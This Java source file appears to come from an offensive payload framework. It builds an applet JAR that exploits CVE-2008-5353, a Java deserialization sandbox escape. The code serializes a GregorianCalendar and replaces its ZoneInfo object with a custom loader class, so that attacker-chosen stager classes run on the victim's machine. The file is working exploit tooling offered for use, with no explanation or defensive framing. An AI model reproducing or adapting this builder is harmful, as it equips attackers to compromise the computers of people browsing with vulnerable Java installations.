package javapayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.jar.Manifest;

public class CVE_2008_5353_AppletJarBuilder {
	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("Usage: java javapayload.builder.CVE_2008_5353_AppletJarBuilder <stager> [<moreStagers...>]");
			return;
		}
		StringBuffer jarName = new StringBuffer("CVE_2008_5353_Applet");
		final Class[] classes = new Class[args.length+4];
		classes[0] = javapayload.loader.CVE_2008_5353.class;
		classes[1] = javapayload.loader.CVE_2008_5353.Loader.class;
		classes[2] = javapayload.loader.CVE_2008_5353.MyURLClassLoader.class;
		classes[3] = javapayload.stager.Stager.class;
		for (int i = 0; i < args.length; i++) {
			jarName.append('_').append(args[i]);
			classes[i+4] = Class.forName("javapayload.stager." + args[i]);
		}
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos) {
			{enableReplaceObject(true);}
			
			protected Object replaceObject(Object obj) throws IOException {
				if (obj instanceof sun.util.calendar.ZoneInfo)
					return new javapayload.loader.CVE_2008_5353.Loader();
				return obj;
			}
		};
		oos.writeObject(new java.util.GregorianCalendar());
		oos.close();		
		JarBuilder.buildJar(jarName.append(".jar").toString(), classes, new Manifest(), baos.toByteArray());
	}
}
